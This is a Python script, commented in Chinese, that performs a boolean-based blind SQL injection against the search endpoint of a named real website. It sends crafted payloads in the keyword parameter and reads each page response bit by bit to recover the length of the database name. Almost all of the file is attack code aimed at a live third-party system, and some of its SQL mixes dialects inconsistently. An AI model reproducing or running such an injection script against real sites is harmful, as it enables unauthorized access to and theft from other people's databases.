import requests
import time
from bs4 import BeautifulSoup

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"}
duibi = "品牌地址：浙江嘉兴"     #用于判断页面状态。这里采用字符串，也可以使用返回长度来判断
url = "http://www.cuwell.com/search/qbrand?keyword=1"
Payload_prefix = "1%'"  # Payload前缀
Payload_suffix = "AND+'1'+LIKE+'1"  # Payload后缀



# def Demo():
#     response = requests.get(url, headers=headers, timeout=20)
#     if Judge_State(response.text) == "正常":
#         print("正常")
#
#     else:
#         print("非正常")




def Judge_State(Content):
    if Content.find(duibi) != -1:
        result = '正常'
        return result
    else:
        result = '非正常'
        return result

def Get_Length(query):

    Payload = "AND LEN(LEN(" + query + "))"
    Payload = Payload.replace(' ', '+')
    f_width = 0

    for i in range(1, 4):
        attack_url = url + Payload_prefix + Payload + "=" + str(i) + Payload_suffix
        response = requests.get(attack_url, headers=headers, timeout=20)
        print(response.request.url)
        if response.text.find(duibi) != -1:
            result = '正常'
            f_width = i
            break
        time.sleep(5)


    print("宽度为：", f_width)


    PAYLOAD1 = "AND MID(LPAD(BIN(SUBSTRING(LEN (" + query + "),"


    result_len = ''         #记录最后的长度(十进制结果)

    for i in range(1, f_width+1):
        # response = requests.get(attack_url, headers=headers)
        # if response.text.find(duibi) != -1:
        #     result = '正常'
        #     f_len = f_len + "0"
        # else:
        #     f_len = f_len + "1"
        # time.sleep(5)
        temp = ''
        for t in range(1, 9):

            PAYLOAD2 = ",1)),8,0)," + str(t) +",1)=0"
            attack_url = url + "') " + PAYLOAD1 + str(i) + PAYLOAD2 + " %23"
            response = requests.get(attack_url, headers=headers, timeout=20)
            print(response.request.url)
            if Judge_State(response.text) == "正常":
                temp = temp + str(0)
                print("正常")
            else:
                temp = temp + str(1)
                print("非正常")
            time.sleep(3)
        print(temp)
        int_len = int(temp, base=2)

        result_len = result_len + str(int_len)
    print("数据长度为:", result_len)
    return result_len

def Main():
    query = "DB_NAME()"
    length = Get_Length(query)



if __name__ == '__main__':
    Main()
